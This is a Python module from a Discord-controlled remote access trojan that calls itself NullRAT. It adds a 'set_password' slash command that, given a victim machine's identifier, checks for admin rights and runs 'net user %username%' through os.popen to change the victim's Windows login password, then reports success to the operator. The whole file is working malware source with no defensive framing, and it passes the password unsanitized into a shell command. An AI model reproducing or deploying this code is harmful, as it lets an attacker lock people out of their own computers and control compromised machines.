from disnake.ext import commands
from datetime import datetime

import os
import ctypes


class changePass(commands.Cog):
    def __init__(self, bot: commands.Bot):
        self.bot = bot

    @commands.slash_command()
    async def set_password(self, ctx, victim, password):
        """Changes the password of victim's windows profile. Admin required

        Parameters
        ----------
        victim: Identifier of the affected computer (found via /listvictims).
        password: New password to change for running user
        """

        if self.bot.valid(victim):
            # Admin detection, this command will not work for regular users
            is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
            if not is_admin:
                return await ctx.response.send_message(
                    embed=self.bot.genEmbed(
                        "NullRAT is not running as admin. Operation aborted",
                        datetime.now(),
                    )
                )

            status = os.popen(r"net user %username% " + password).read()
            if "success" in status.lower():
                return await ctx.response.send_message(
                    embed=self.bot.genEmbed(
                        rf"Success: Password changed to {password}", datetime.now()
                    )
                )

            return await ctx.response.send_message(rf"Unspecified error! Log: {status}")


def setup(bot: commands.Bot):
    bot.add_cog(changePass(bot))
